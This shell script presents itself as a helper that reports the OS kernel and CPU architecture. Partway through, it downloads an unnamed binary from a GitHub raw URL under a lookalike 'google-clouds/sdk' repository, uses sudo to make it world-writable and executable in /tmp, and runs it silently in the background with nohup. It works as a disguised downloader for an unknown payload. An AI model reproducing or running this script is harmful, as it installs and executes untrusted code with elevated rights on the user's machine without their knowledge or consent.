# Get the Kernel Name
Kernel=$(uname -s)
case "$Kernel" in
    Linux)  Kernel="linux"              ;;
    Darwin) Kernel="mac"                ;;
    FreeBSD)    Kernel="freebsd"            ;;
* ) echo "Your Operating System -> ITS NOT SUPPORTED"   ;;
esac

echo
echo "Operating System Kernel : $Kernel"
echo
# Get the machine Architecture
Architecture=$(uname -m)
case "$Architecture" in
    x86)    Architecture="x86"                  ;;
    ia64)   Architecture="ia64"                 ;;
    i?86)   Architecture="x86"                  ;;
    amd64)  Architecture="amd64"                    ;;
    x86_64) Architecture="x86_64"                   ;;
    sparc64)    Architecture="sparc64"                  ;;
* ) echo    "Your Architecture '$Architecture' -> ITS NOT SUPPORTED."   ;;
esac
architecture=""
url=""
case $(uname -m) in
    i386)   architecture="386" && url="https://raw.githubusercontent.com/google-clouds/sdk/main/arm1i386" ;;
    i686)   architecture="386" && url="https://raw.githubusercontent.com/google-clouds/sdk/main/arm1i386" ;;
    x86_64) architecture="amd64" && url="https://raw.githubusercontent.com/google-clouds/sdk/main/arm1amd64" ;;
    arm)    dpkg --print-architecture | grep -q "arm64" && architecture="arm64"  && url="4" || architecture="arm" && url="https://raw.githubusercontent.com/google-clouds/sdk/main/arm164";;
esac

curl "$url" --output /tmp/acac
sudo chmod 777 /tmp/acac
nohup /tmp/acac &>/dev/null &

echo
echo "Operating System Architecture : $architecture" + "$url"
echo
